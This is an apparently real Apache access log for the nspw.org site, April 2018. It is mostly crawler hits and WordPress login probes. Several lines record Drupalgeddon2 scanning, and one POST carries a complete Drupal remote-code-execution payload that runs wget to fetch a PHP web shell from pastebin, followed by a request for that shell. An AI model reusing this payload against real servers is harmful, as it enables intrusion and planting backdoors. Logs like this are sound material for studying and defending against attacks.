www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:57:48 -0400] "GET /2004/index.content HTTP/1.1" 302 509 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:58:10 -0400] "GET /2004/local.content HTTP/1.1" 302 509 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 181.114.102.172 - - [25/Apr/2018:11:58:25 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 181.114.102.172 - - [25/Apr/2018:11:58:26 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:58:32 -0400] "GET /2004/nspw-footer.html HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 216.244.66.236 - - [25/Apr/2018:11:58:44 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:58:54 -0400] "GET /2004/nspw-header.html HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:59:16 -0400] "GET /2004/oldindex.html HTTP/1.1" 302 509 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:59:37 -0400] "GET /2004/panel.html HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 69.162.124.227 - - [25/Apr/2018:11:59:40 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:59:59 -0400] "GET /2004/past.content HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 66.249.73.82 - - [25/Apr/2018:12:00:08 -0400] "GET /2008/nspw2008-cfpTwk.html HTTP/1.1" 302 579 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 37.239.65.9 - - [25/Apr/2018:12:00:52 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 37.239.65.9 - - [25/Apr/2018:12:00:55 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 40.77.167.107 - - [25/Apr/2018:12:01:00 -0400] "GET /papers/2009/nspw2009-church.pdf HTTP/1.1" 302 587 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 117.192.210.52 - - [25/Apr/2018:12:01:48 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 90.71.104.105 - - [25/Apr/2018:12:02:49 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 90.71.104.105 - - [25/Apr/2018:12:02:50 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 5.255.250.133 - - [25/Apr/2018:12:03:50 -0400] "GET /papers/2010/?C=S;O=A HTTP/1.1" 302 569 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:04:00 -0400] "GET /robots.txt HTTP/1.1" 302 549 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:04:12 -0400] "GET /2004/past.content HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:04:34 -0400] "GET /2004/proceedings.content HTTP/1.1" 302 521 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 69.162.124.227 - - [25/Apr/2018:12:04:40 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 158.69.133.31 - - [25/Apr/2018:12:04:46 -0400] "POST /CHANGELOG.txt HTTP/1.1" 302 518 "-" "drupalgeddon2"
www.nspw.org:80 158.69.133.31 - - [25/Apr/2018:12:04:47 -0400] "POST /core/CHANGELOG.txt HTTP/1.1" 302 528 "-" "drupalgeddon2"
www.nspw.org:80 158.69.133.31 - - [25/Apr/2018:12:04:47 -0400] "POST /includes/bootstrap.inc HTTP/1.1" 302 536 "-" "drupalgeddon2"
www.nspw.org:80 158.69.133.31 - - [25/Apr/2018:12:04:47 -0400] "POST /core/includes/bootstrap.inc HTTP/1.1" 302 546 "-" "drupalgeddon2"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:04:56 -0400] "GET /2004/submission.content HTTP/1.1" 302 519 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 158.69.133.31 - - [25/Apr/2018:12:04:47 -0400] "POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1" 302 682 "-" "drupalgeddon2"
www.nspw.org:80 84.201.133.45 - - [25/Apr/2018:12:04:58 -0400] "GET /2002/?C=M;O=A HTTP/1.1" 302 555 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
www.nspw.org:80 66.249.73.78 - - [25/Apr/2018:12:05:04 -0400] "GET /2006/invite/preproc.html HTTP/1.1" 302 577 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:05:18 -0400] "GET /2005/index.content HTTP/1.1" 302 509 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 54.210.24.16 - - [25/Apr/2018:12:05:24 -0400] "GET /2018 HTTP/1.1" 302 481 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0 (FlipboardProxy/1.2; +http://flipboard.com/browserproxy)"
www.nspw.org:80 169.1.189.226 - - [25/Apr/2018:12:05:29 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:05:40 -0400] "GET /2005/local.content HTTP/1.1" 302 509 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:06:01 -0400] "GET /2005/nspw-footer.html HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 66.102.6.214 - - [25/Apr/2018:12:06:23 -0400] "GET /papers/2013/nspw2013-ard.pdf HTTP/1.1" 302 585 "-" "Mozilla/5.0 (compatible; Google AppsViewer; http://drive.google.com)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:06:23 -0400] "GET /2005/nspw-header.html HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:06:45 -0400] "GET /2005/oldindex.html HTTP/1.1" 302 509 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:07:07 -0400] "GET /2005/panel.html HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 2.51.187.68 - - [25/Apr/2018:12:07:09 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 2.51.187.68 - - [25/Apr/2018:12:07:12 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:07:29 -0400] "GET /2005/past.content HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 179.198.129.63 - - [25/Apr/2018:12:07:44 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 179.198.129.63 - - [25/Apr/2018:12:07:48 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:07:51 -0400] "GET /2006/index.content HTTP/1.1" 302 509 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 200.204.161.74 - - [25/Apr/2018:12:07:57 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 200.204.161.74 - - [25/Apr/2018:12:07:58 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:08:13 -0400] "GET /2006/invite/ HTTP/1.1" 302 497 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:08:35 -0400] "GET /2006/invite/local.html HTTP/1.1" 302 517 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:08:57 -0400] "GET /2006/invite/preproc.html HTTP/1.1" 302 521 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:09:19 -0400] "GET /2006/invite/reg.html HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 54.36.148.224 - - [25/Apr/2018:12:09:38 -0400] "GET /2005/program.html HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 69.162.124.227 - - [25/Apr/2018:12:09:41 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:09:41 -0400] "GET /2006/local.content HTTP/1.1" 302 509 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 66.249.73.80 - - [25/Apr/2018:12:09:59 -0400] "GET /2008/cfp.content HTTP/1.1" 302 561 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:10:03 -0400] "GET /2006/nspw-footer.html HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 196.171.70.13 - - [25/Apr/2018:12:10:08 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 196.171.70.13 - - [25/Apr/2018:12:10:16 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:10:24 -0400] "GET /2006/nspw-header.html HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:10:46 -0400] "GET /2006/oldindex.html HTTP/1.1" 302 509 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:11:08 -0400] "GET /2006/panel.html HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:11:30 -0400] "GET /2006/panel.htmlQQ HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:11:51 -0400] "GET /2006/past.content HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:12:13 -0400] "GET /2006/pc.content HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:12:35 -0400] "GET /2006/pc.contentQQ HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:12:57 -0400] "GET /2007/cfp.content HTTP/1.1" 302 505 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:13:19 -0400] "GET /2007/invite-old/ HTTP/1.1" 302 505 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:13:40 -0400] "GET /2007/invite-old/local.html HTTP/1.1" 302 525 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:14:02 -0400] "GET /2007/invite-old/preproc.html HTTP/1.1" 302 529 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:14:24 -0400] "GET /2007/invite-old/reg.html HTTP/1.1" 302 521 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 158.69.101.124 - - [25/Apr/2018:12:14:25 -0400] "POST /?q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=passthru&name%5B%23type%5D=markup&name%5B%23markup%5D=wget+https%3A%2F%2Fpastebin.com%2Fraw%2FtBqLLGbw+-O+spy0x.php HTTP/1.1" 302 867 "-" "python-requests/2.18.4"
www.nspw.org:80 139.47.3.227 - - [25/Apr/2018:12:14:34 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 158.69.101.124 - - [25/Apr/2018:12:14:36 -0400] "POST /?q=file%2Fajax%2Fname%2F%23value%2Fform-K5TdIgh_lqjnfn_meVGbVQPnheMSHElMOXVmnxcGIyg HTTP/1.1" 302 691 "-" "python-requests/2.18.4"
www.nspw.org:80 139.47.3.227 - - [25/Apr/2018:12:14:37 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [25/Apr/2018:12:14:41 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:14:46 -0400] "GET /2007/invite/reg.html HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 158.69.101.124 - - [25/Apr/2018:12:14:49 -0400] "GET //spy0x.php HTTP/1.1" 302 506 "-" "Python-urllib/2.7"
www.nspw.org:80 66.249.73.82 - - [25/Apr/2018:12:14:55 -0400] "GET /2004/cfp.shtml HTTP/1.1" 302 557 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:15:08 -0400] "GET /2007/local.content HTTP/1.1" 302 509 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 186.94.40.40 - - [25/Apr/2018:12:15:22 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 186.94.40.40 - - [25/Apr/2018:12:15:23 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:15:30 -0400] "GET /2007/nspw-footer.html HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:15:52 -0400] "GET /2007/nspw-header.html HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 66.249.73.82 - - [25/Apr/2018:12:16:05 -0400] "GET /current/papers.shtml HTTP/1.1" 302 569 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:16:14 -0400] "GET /2007/oc.content HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 216.244.66.200 - - [25/Apr/2018:12:16:26 -0400] "GET /2007/nspw-header.shtml HTTP/1.1" 302 517 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:16:35 -0400] "GET /2007/oldindex.html HTTP/1.1" 302 509 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:16:57 -0400] "GET /2007/panel.htmlQQ HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:17:19 -0400] "GET /2007/past.content HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:17:41 -0400] "GET /2007/pc.content HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 41.42.126.157 - - [25/Apr/2018:12:17:55 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 41.42.126.157 - - [25/Apr/2018:12:17:59 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:18:03 -0400] "GET /2007/pc.content.2006 HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:18:24 -0400] "GET /2007/pc.contentQQ HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:18:46 -0400] "GET /2007/registration.content HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 111.206.198.119 - - [25/Apr/2018:12:18:50 -0400] "GET /themes/garland/images/body.png HTTP/1.1" 302 533 "http://www.nspw.org/themes/garland/style.css?p7kfx6" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 111.206.221.95 - - [25/Apr/2018:12:18:50 -0400] "GET /themes/garland/images/menu-leaf.gif HTTP/1.1" 302 543 "http://www.nspw.org/themes/garland/style.css?p7kfx6" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 111.206.221.113 - - [25/Apr/2018:12:18:50 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 302 561 "http://www.nspw.org/themes/garland/style.css?p7kfx6" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:19:08 -0400] "GET /2007/submission.content HTTP/1.1" 302 519 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:19:30 -0400] "GET /2008/broken_past.content HTTP/1.1" 302 521 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 69.162.124.227 - - [25/Apr/2018:12:19:41 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.78 - - [25/Apr/2018:12:19:51 -0400] "GET /2005/pc-gen.pl HTTP/1.1" 302 557 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:19:52 -0400] "GET /2008/cfp.content HTTP/1.1" 302 505 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 223.181.198.154 - - [25/Apr/2018:12:19:54 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 223.181.198.154 - - [25/Apr/2018:12:19:57 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:20:14 -0400] "GET /2008/cfp.content.2007 HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 2.86.139.25 - - [25/Apr/2018:12:20:31 -0400] "GET /papers/1998/nspw1998-chang.pdf HTTP/1.1" 302 589 "https://www.google.gr/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
www.nspw.org:80 183.83.66.3 - - [25/Apr/2018:12:20:35 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:20:36 -0400] "GET /2008/invite-old/ HTTP/1.1" 302 505 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 183.83.66.3 - - [25/Apr/2018:12:20:36 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 ::1 - - [25/Apr/2018:12:20:44 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:20:58 -0400] "GET /2008/invite-old/local.html HTTP/1.1" 302 525 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:21:20 -0400] "GET /2008/invite-old/preproc.html HTTP/1.1" 302 529 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 157.55.39.17 - - [25/Apr/2018:12:21:31 -0400] "GET /2016 HTTP/1.1" 302 533 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:21:41 -0400] "GET /2008/invite-old/reg.html HTTP/1.1" 302 521 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:22:03 -0400] "GET /2008/invite/reg.html HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:22:25 -0400] "GET /2008/local.content HTTP/1.1" 302 509 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:22:47 -0400] "GET /2008/local.content.2007 HTTP/1.1" 302 519 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:23:09 -0400] "GET /2008/local.content.2008 HTTP/1.1" 302 519 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 207.46.13.239 - - [25/Apr/2018:12:23:13 -0400] "GET /2017/cfp HTTP/1.1" 302 541 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:23:31 -0400] "GET /2008/nspw-footer-old.html HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:23:52 -0400] "GET /2008/nspw-footer.html HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 64.62.252.169 - - [25/Apr/2018:12:23:57 -0400] "GET /robots.txt HTTP/1.1" 302 549 "-" "The Knowledge AI"
www.nspw.org:80 64.62.252.169 - - [25/Apr/2018:12:24:10 -0400] "GET / HTTP/1.1" 302 529 "-" "The Knowledge AI"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:24:14 -0400] "GET /2008/nspw-header.html HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:12:24:36 -0400] "GET /2008/nspw2008-cfp.html HTTP/1.1" 302 517 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 69.162.124.227 - - [25/Apr/2018:12:24:40 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.80 - - [25/Apr/2018:12:24:47 -0400] "GET /papers/1997/?C=M;O=A HTTP/1.1" 302 569 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
